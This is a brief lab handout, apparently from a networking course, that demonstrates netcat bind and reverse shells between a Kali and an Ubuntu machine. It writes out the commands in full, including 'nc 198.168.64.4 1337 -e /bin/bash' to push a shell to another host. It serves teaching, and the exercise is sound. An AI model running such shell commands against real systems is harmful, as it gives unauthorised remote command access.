# Bind and reverse shells

## Required Machines
- Kali
- Ubuntu

## Steps
1. Open a terminal on each instance (__ubuntu__ and __kali__)
2. `Bind shell:` Run `nc –l –p 1337 –e /bin/bash` on the __kali__ instance
3. Run `nc kali 1337` on the __ubuntu__ instance to access the bound shell
4. You can run commands like `uname -a` and `whoami` to verify you've got a shell on the Kali box
5. `Reverse Shell:` Run `nc –l –p 1337` on the __ubuntu__ instance to prepare for an incoming reverse shell
6. Run `nc 198.168.64.4 1337 –e /bin/bash` on the __kali__ instance
7. Verify the reverse shell on the __ubuntu__ instance as you did before

## FAQ
### Why am I shelling to ubuntu and not from ubuntu?
Turns out Ubuntu comes with the BSD format of netcat which does not include the `-e` "execute on connection" flag, so it's not as simple to demonstrate remote shelling. Netcat on the Kali instance _does_ have this flag. 

## Presentation covering this:
`4 - Networking is important in the tech industry.pdf`